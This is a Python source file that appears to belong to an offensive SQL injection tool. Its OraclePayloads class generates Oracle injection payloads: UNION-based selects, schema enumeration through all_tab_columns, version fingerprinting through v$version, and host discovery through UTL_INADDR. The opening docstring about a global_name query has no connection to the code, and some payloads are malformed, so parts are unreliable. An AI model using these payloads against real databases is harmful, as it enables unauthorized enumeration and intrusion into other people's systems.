"""
This SQL command is selecting the global_name column from the global_name table. It will retrieve the values stored in the global_name column for each row in the table. However, without more context or information about the database schema and data, it's difficult to provide a more specific explanation.


"""
import os
import sys
cur = os.getcwd()
sys.path.append(cur)
from INFO.common import tables,columns
from random import choice
from INFO.ccolumns import commom_table_naming

class OraclePayloads:
    @staticmethod
    def db_column_payload(column=choice(commom_table_naming() if commom_table_naming() is not None else ""),table=choice(tables)):
        payload = f"""

    SELECT {column} FROM {table};
    SELECT {column} FROM {table};
    SELECT {column} FROM {table};
    SELECT {column} FROM {table};
    """
        retval = payload
        return str(retval)
    
    @staticmethod
    def db_column_list(table=choice(tables),column=choice(commom_table_naming() if commom_table_naming() is not None else ""),tablename="blah",owner="foo",**kwargs):
        payload = f"""
SELECT {column} FROM all_tab_columns WHERE {table} = '{tablename}';
SELECT column_name FROM all_tab_columns WHERE {table} = '{tablename}' and owner = '{owner}';"""
        retval = payload
        return str(retval)
    
    @staticmethod
    def oracle_injection_payload(table=choice(tables),column=choice(commom_table_naming() if commom_table_naming() is not None else ""),view="v$version"):
        #TODO: create parameters in argprase for indicating table and columns and prompt it from the user
        #!view column : v$version
        #!Oracle% : oracle db version
        #!TNS%: transport network substrate 
        payload = f"""
SELECT {column} FROM {table} UNION SELECT * FROM {column}
SELECT {column} FROM {view} WHERE {column} LIKE 'Oracle%';
SELECT {column} FROM {view} WHERE {column} LIKE 'TNS%';
SELECT {column} FROM {view};
"""
        retval = payload
        return str(retval)
    
    @staticmethod
    def oracle_injection_database_list(column=choice(commom_table_naming() if commom_table_naming() is not None else ""),table=choice(tables)):
        payload = f"""
SELECT DISTINCT {column} FROM {table};
 """
        retval = payload
        return str(retval)
    
    @staticmethod 
    def Host_name_oracle(hostname=choice(columns),viewcolumn=choice(commom_table_naming()),table=choice(tables)):
        payload = f"""
SELECT {hostname} FROM {viewcolumn};
SELECT UTL_INADDR.get_host_name FROM {table};
SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM {table};
SELECT UTL_INADDR.get_host_address FROM {table};
"""
        retval = payload
        return str(retval)
    